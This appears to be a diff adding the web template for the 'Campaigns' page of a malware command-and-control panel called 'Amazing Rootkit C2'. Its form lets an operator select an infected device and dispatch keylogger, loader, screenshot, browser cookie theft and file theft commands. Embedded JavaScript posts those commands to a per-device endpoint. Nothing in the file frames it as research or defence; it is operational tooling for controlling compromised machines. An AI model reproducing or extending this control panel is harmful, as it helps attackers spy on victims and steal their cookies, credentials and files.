@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Campaigns</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+    <!-- FontAwesome -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+    <!-- Chart.js -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <!-- Custom CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+</head>
+<body>
+    <div class="container-fluid">
+        <div class="row">
+            <!-- Sidebar -->
+            <nav class="col-md-2 d-md-block bg-dark sidebar sidebar-dark accordion">
+                <div class="sidebar-brand d-flex align-items-center justify-content-center">
+                    <div class="sidebar-brand-icon">
+                        <i class="fas fa-user-secret"></i>
+                    </div>
+                    <div class="sidebar-brand-text mx-3"><strong>Amazing Rootkit<sup> C2</sup></strong></div>
+                </div>
+                <hr class="sidebar-divider my-0">
+                <!-- Sidebar Menu -->
+                <ul class="navbar-nav" id="accordionSidebar">
+                    <li class="nav-item active">
+                        <a class="nav-link" href="dashboard">
+                            <i class="fas fa-fw fa-tachometer-alt"></i>
+                            <span>Dashboard</span>
+                        </a>
+                    </li>
+                    <hr class="sidebar-divider">
+                    <div class="sidebar-heading"><strong>Interface</strong></div>
+                    <li class="nav-item">
+                        <a class="nav-link collapsed" href="#" id="campaigns-toggle">
+                            <i class="fas fa-fw fa-cog"></i>
+                            <span>Campaigns</span>
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link collapsed" href="management">
+                            <i class="fas fa-fw fa-wrench"></i>
+                            <span>Management</span>
+                        </a>
+                    </li>
+                    <hr class="sidebar-divider">
+                    <div class="sidebar-heading"><strong>Addons</strong></div>
+                    <li class="nav-item">
+                        <a class="nav-link collapsed" href="info">
+                            <i class="fas fa-fw fa-folder"></i>
+                            <span>Info</span>
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="lastActivity">
+                            <i class="fas fa-fw fa-clock"></i>
+                            <span>Last Activity</span>
+                        </a>
+                    </li>
+                    <hr class="sidebar-divider d-none d-md-block">
+                    <!-- Logout Button -->
+                    <li class="nav-item mt-auto">
+                        <a class="nav-link" id="logout" href="login">
+                            <i class="fas fa-sign-out-alt"></i>
+                            <span>Logout</span>
+                        </a>
+                    </li>
+                </ul>
+            </nav>
+            <!-- Main Content -->
+            <main role="main" class="col-md-9 ml-sm-auto col-lg-10 px-4">
+                <div class="d-sm-flex align-items-center justify-content-between mb-4">
+                    <h1 class="h3 mb-0 text-light"><strong>Campaigns</strong></h1>
+                </div>
+
+                <!-- Choose Device Form -->
+                <div id="choose-device" class="card campaign-card bg-dark text-light mt-4">
+                    <div class="card-body">
+                        <h4 class="card-title"><strong>Select a Device...</strong></h4>
+                        <form id="campaign-form">
+                            <div class="form-group">
+                                <select id="campaign" name="campaign" class="form-control" required>
+                                    <option value="">Select a device</option>
+                                    {% for device in devices %}
+                                        <option value="{{ device }}">{{ device }}</option>
+                                    {% endfor %}
+                                </select>
+                            </div>
+                            <button type="button" class="btn btn-primary btn-block" id="show-command-form">Submit</button>
+                        </form>
+                    </div>
+                </div>
+<!-- Command Form -->
+<div id="command-form" class="card bg-dark text-light mt-4" style="display:none;max-width: 600px; margin: 0 auto;">
+    <div class="card-body">
+        <h2 class="card-title">Send Command</h2>
+        <form id="send-command-form">
+            <div class="form-group">
+                <select id="command-select" name="command" class="form-control" required>
+                    <option value="keylogger">Keylogger</option>
+                    <option value="loader">Loader</option>
+                    <option value="screenshot">Screenshot Feature</option>
+                    <option value="cookies">Browsers’ Cookies Theft</option>
+                    <option value="file_theft">File Theft Feature</option>
+                </select>
+            </div>
+            <div id="file-theft-options" style="display:none;">
+                <div class="form-group">
+                    <label for="file-types">File Types (comma separated, e.g., *.jpg, *.txt):</label>
+                    <input type="text" id="file-types" name="file-types" class="form-control">
+                    <label for="file-path">File Path:</label>
+                    <input type="text" id="file-path" name="file-path" class="form-control" pattern="^/.*" placeholder="/path/to/files">
+                </div>
+                <button type="button" class="btn btn-secondary btn-sm save-task-btn" id="save-task">Save Task</button>
+            </div>
+            <button type="submit" class="btn btn-primary btn-block">Send Command</button>
+        </form>
+    </div>
+</div>
+
+<!-- Results Display -->
+<div id="results" class="card bg-dark text-light mt-4" style="display:none;">
+    <div class="card-body">
+        <h2 class="card-title">Results</h2>
+        <pre id="results-content" class="bg-dark text-light p-3"></pre>
+    </div>
+</div>
+
+            </main>
+        </div>
+    </div>
+    <script>
+document.addEventListener('DOMContentLoaded', function() {
+    let fileTheftTasks = {};
+
+    // Handle device form visibility
+    document.getElementById('show-command-form').addEventListener('click', function() {
+        const device = document.getElementById('campaign').value;
+        
+        if (device) {
+            // Hide device selection form and show command form
+            document.getElementById('choose-device').style.display = 'none';
+            document.getElementById('command-form').style.display = 'block';
+            // Store the selected device ID in the form's data attribute
+            document.getElementById('send-command-form').setAttribute('data-device-id', device);
+        } else {
+            alert('Please select a device.');
+        }
+    });
+
+    // Handle command selection visibility
+    document.getElementById('command-select').addEventListener('change', function() {
+        const selectedCommand = this.value;
+        const fileTheftOptions = document.getElementById('file-theft-options');
+        
+        if (selectedCommand === 'file_theft') {
+            fileTheftOptions.style.display = 'block';
+        } else {
+            fileTheftOptions.style.display = 'none';
+        }
+    });
+
+    // Handle saving of file theft tasks
+    document.getElementById('save-task').addEventListener('click', function() {
+        const fileTypesInput = document.getElementById('file-types').value;
+        const filePath = document.getElementById('file-path').value;
+
+        if (fileTypesInput && filePath.startsWith('/')) {
+            // Sanitize the inputs
+            const sanitizedFileTypes = fileTypesInput.split(',').map(type => type.trim().replace(/[^\w*]/g, '')); // Allow only alphanumeric and *
+            const sanitizedFilePath = filePath.replace(/(\.\.\/|\/\.{2,}|\/\.\.|\/\/|\\)/g, ''); // Remove potential path traversal sequences
+
+            const taskId = Date.now(); // Use timestamp as unique ID
+            fileTheftTasks[taskId] = {
+                start_path: sanitizedFilePath,
+                files: sanitizedFileTypes
+            };
+
+            // Clear inputs
+            document.getElementById('file-types').value = '';
+            document.getElementById('file-path').value = '';
+
+            alert('Task saved. You can add more tasks.');
+        } else {
+            alert('Please provide valid file types and file path.');
+        }
+    });
+
+    // Handle form submission and show results
+    document.getElementById('send-command-form').addEventListener('submit', function(event) {
+        event.preventDefault();
+        
+        const commandValue = document.getElementById('command-select').value;
+        const device = document.getElementById('campaign').value;
+        
+        if (!commandValue) {
+            alert('Please select a command.');
+            return;
+        }
+
+        let requestData = { Cmd: commandValue };
+
+        if (commandValue === 'file_theft') {
+            requestData.tasks = fileTheftTasks;
+        }
+
+        // Hide form and show results
+        document.getElementById('command-form').style.display = 'none';
+        document.getElementById('results').style.display = 'block';
+        document.getElementById('results-content').textContent = `Results for ${commandValue} on ${device}.`;
+
+        // Get the device ID from the form's data attribute
+        const deviceName = this.getAttribute('data-device-id');
+
+        // Send the command to the server
+        fetch(`/${deviceName}/add_command/`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(requestData)
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.status === 'success') {
+                alert('Command sent successfully.');
+            } else {
+                alert('Failed to send command. Response: ' + JSON.stringify(data));
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('An error occurred while sending the command.');
+        });
+    });
+});
+
+    </script>
+    <!-- JavaScript Libraries -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+    <!-- Custom JavaScript -->
+    <script src="{{ url_for('static', filename='scripts.js') }}"></script>
+</body>
+</html>
